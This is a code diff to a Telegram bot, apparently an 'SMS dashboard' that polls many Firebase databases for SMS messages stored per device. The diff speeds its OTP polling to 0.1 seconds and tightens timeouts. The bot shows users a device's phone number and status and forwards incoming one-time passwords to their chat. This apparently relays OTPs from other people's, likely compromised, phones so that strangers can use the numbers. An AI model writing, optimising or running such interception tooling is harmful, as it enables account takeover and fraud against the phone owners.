@@ -7,7 +7,7 @@ Firebase SMS Dashboard Bot — FREE Edition (No Refer / No Credits / Manual Refr
 - ✅ Force Join Channels (Admin controlled, default EMPTY)
 - ❌ No Referral, No Credits, No Captcha
 - ❌ No Auto-Refresh (sirf admin manual refresh)
-- ⚡ Fast OTP delivery (0.5s polling)
+- ⚡ ULTRA FAST OTP delivery (0.1s polling)
 - 📉 Render-optimized (bandwidth saving)
 - Flask keep-alive server
 """
@@ -49,9 +49,9 @@ logging.basicConfig(
 logger = logging.getLogger("FirebaseSMSBot")
 
 # ============================================================
-# CONSTANTS (⚡ Speed + 📉 Bandwidth Optimized)
+# CONSTANTS (⚡ ULTRA FAST + 📉 Bandwidth Optimized)
 # ============================================================
-FB_REQUEST_TIMEOUT = 6
+FB_REQUEST_TIMEOUT = 4
 FB_RETRY_MAX = 0
 FB_RETRY_BACKOFF = 1.2
 FB_CLIENTS_MAX_BYTES = 50 * 1024 * 1024
@@ -59,8 +59,8 @@ FB_MESSAGES_LIMIT = 5
 MAX_FIREBASES = 40
 CLEANUP_INTERVAL = 60
 
-# ⚡ Fast OTP: 0.5s polling
-SMS_MONITOR_INTERVAL = 0.5
+# ⚡ ULTRA FAST OTP: 0.1s polling
+SMS_MONITOR_INTERVAL = 0.1
 SMS_MONITOR_DURATION = 300
 SMS_MONITOR_IDLE_TIMEOUT = 600
 
@@ -104,7 +104,7 @@ def flask_root():
         return jsonify({
             "status": "ok",
             "service": "Firebase SMS Bot (FREE)",
-            "version": "FREE v4",
+            "version": "FREE v4 (0.1s ULTRA FAST)",
             "uptime_seconds": uptime,
             "bot_username": BOT_USERNAME,
             "firebases": len(global_fb_list),
@@ -112,6 +112,7 @@ def flask_root():
             "force_join_channels": len(REQUIRED_CHANNELS),
             "active_sms_monitors": len(sms_monitor_tasks),
             "maintenance_mode": maintenance_mode,
+            "sms_poll_interval": SMS_MONITOR_INTERVAL,
             "server_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         }), 200
     except Exception as exc:
@@ -159,19 +160,19 @@ def start_flask_thread():
 
 
 # ============================================================
-# GLOBAL HTTP SESSION
+# GLOBAL HTTP SESSION (⚡ Optimized timeouts)
 # ============================================================
 async def get_http_session() -> aiohttp.ClientSession:
     global GLOBAL_HTTP_SESSION
     if GLOBAL_HTTP_SESSION is None or GLOBAL_HTTP_SESSION.closed:
         connector = aiohttp.TCPConnector(
-            limit=100, limit_per_host=30,
+            limit=200, limit_per_host=50,
             ttl_dns_cache=300, keepalive_timeout=60,
             enable_cleanup_closed=True,
         )
         GLOBAL_HTTP_SESSION = aiohttp.ClientSession(
             connector=connector,
-            timeout=aiohttp.ClientTimeout(total=6, connect=2),
+            timeout=aiohttp.ClientTimeout(total=4, connect=1),
         )
     return GLOBAL_HTTP_SESSION
 
@@ -793,11 +794,11 @@ async def fetch_last_sms(fb_url: str, device_id: str, limit: int = FB_MESSAGES_L
     try:
         url = build_fb_endpoint(fb_url, f"messages/{device_id}",
                                 query=f'orderBy="$key"&limitToLast={limit}')
-        data, status, _ = await fb_get_json(session, url, timeout=3)
+        data, status, _ = await fb_get_json(session, url, timeout=2)
         if status == "SUCCESS" and isinstance(data, (dict, list)):
             return _newest_with_keys(data, limit=limit)
         url = build_fb_endpoint(fb_url, f"messages/{device_id}")
-        data, status, _ = await fb_get_json(session, url, timeout=3)
+        data, status, _ = await fb_get_json(session, url, timeout=2)
         if status != "SUCCESS" or not isinstance(data, (dict, list)):
             return []
         return _newest_with_keys(data, limit=limit)
@@ -1555,7 +1556,7 @@ async def generate_number_callback(update: Update, context: ContextTypes.DEFAULT
         f"📶 Network: {network}\n"
         f"🤖 Android: {android}\n"
         f"🔋 Battery: {battery}\n\n"
-        f"✅ *OTP Monitor ON*\n"
+        f"✅ *OTP Monitor ON (⚡ 0.1s)*\n"
         f"Naya OTP turant is chat me aayega.")
     await _safe_edit_callback_message(
         q, text_msg, parse_mode="Markdown",
@@ -1781,7 +1782,7 @@ async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ============================================================
-# SMS MONITOR
+# SMS MONITOR (⚡ ULTRA FAST 0.1s)
 # ============================================================
 async def _delete_monitor_messages(bot, uid: int, chat_id: int, message_ids=None):
     state = sms_monitor_state.get(uid, {})
@@ -1882,11 +1883,12 @@ async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
                 if (time.monotonic() - last_activity) >= SMS_MONITOR_IDLE_TIMEOUT:
                     stop_reason = "idle"
                     break
+            # ⚡ ULTRA FAST: 2s timeout for messages fetch
             data, status, err = await fb_get_json(session, url_with_query,
-                                                   retries=0, timeout=3)
+                                                   retries=0, timeout=2)
             if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data:
                 data, status, err = await fb_get_json(session, url_plain,
-                                                       retries=0, timeout=3)
+                                                       retries=0, timeout=2)
             if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data:
                 await asyncio.sleep(SMS_MONITOR_INTERVAL)
                 continue
@@ -1940,6 +1942,7 @@ async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
                                  uid, e, exc_info=True)
             if len(seen_fingerprints) > 200:
                 seen_fingerprints = set(fp for _, _, fp in current_fps)
+            # ⚡ ULTRA FAST: 0.1s polling
             await asyncio.sleep(SMS_MONITOR_INTERVAL)
 
         if not unlimited:
@@ -1998,7 +2001,7 @@ def start_sms_monitor(bot, uid: int, chat_id: int, device_id: str,
         baseline_fingerprints=baseline_fingerprints,
         fb_url=fb_url, task_token=task_token, state=state))
     sms_monitor_tasks[uid] = task
-    logger.info("[SMS MONITOR] started uid=%s device=%s interval=%.1fs suppress=%s",
+    logger.info("[SMS MONITOR] started uid=%s device=%s interval=%.2fs suppress=%s",
                 uid, device_id, SMS_MONITOR_INTERVAL, not bool(baseline_fingerprints))
 
 
@@ -2141,7 +2144,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🔗 Firebases: `{len(global_fb_list)}`\n"
             f"📢 Force-join channels: `{len(REQUIRED_CHANNELS)}`\n"
             f"📨 Active SMS monitors: `{len(sms_monitor_tasks)}`\n"
-            f"⚡ SMS poll: `{SMS_MONITOR_INTERVAL}s`\n"
+            f"⚡ SMS poll: `{SMS_MONITOR_INTERVAL}s (ULTRA FAST)`\n"
             f"🌐 Flask: `{FLASK_HOST}:{FLASK_PORT}`\n"
             f"🎁 Mode: `FREE + Manual Refresh`",
             parse_mode="Markdown", reply_markup=admin_back_kb())
@@ -2550,7 +2553,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "📨 *SMS Monitor Started*\n\n"
             f"📱 *Device:* `{info.get('real_cid', device_id)}`\n"
             f"📞 *Number:* `{phone}`\n\n"
-            "⚡ *Speed:* Fast polling\n\n"
+            "⚡ *Speed:* ULTRA FAST (0.1s)\n\n"
             "🔔 Naya SMS turant yahan forward hoga.",
             parse_mode="Markdown", reply_markup=sms_monitor_kb(device_id))
         state = sms_monitor_state.get(uid)
@@ -2666,7 +2669,7 @@ def main():
     print(f"  Force-join channels: {len(REQUIRED_CHANNELS)}")
     print(f"  Mode: 🎁 FREE (No Refer / No Credits / No Captcha)")
     print(f"  Auto device refresh: ❌ DISABLED (sirf admin manual)")
-    print(f"  SMS poll interval: {SMS_MONITOR_INTERVAL}s (⚡ fast OTP)")
+    print(f"  SMS poll interval: {SMS_MONITOR_INTERVAL}s (⚡ ULTRA FAST)")
     print(f"  First-cycle suppress: ✅ (purane SMS skip)")
     print(f"  Flask keep-alive: {FLASK_HOST}:{FLASK_PORT} 🌐")
     print("=" * 60)
@@ -2702,7 +2705,7 @@ def main():
             logger.warning("could not cache bot username: %s", exc)
             BOT_USERNAME = "YourBot"
         await get_http_session()
-        logger.info("⚡ Global HTTP session ready")
+        logger.info("⚡ Global HTTP session ready (0.1s ULTRA FAST mode)")
         application.bot_data["maintenance_task"] = asyncio.create_task(
             _maintenance_loop(application.bot))
         # 📌 Auto device refresh hata diya — sirf admin manual button se refresh hoga
@@ -2716,7 +2719,7 @@ def main():
 
     app.post_init = _post_init
     app.post_shutdown = _post_stop_with_cleanup
-    print("🚀 Bot running...")
+    print("🚀 Bot running... (0.1s ULTRA FAST OTP mode)")
     app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 
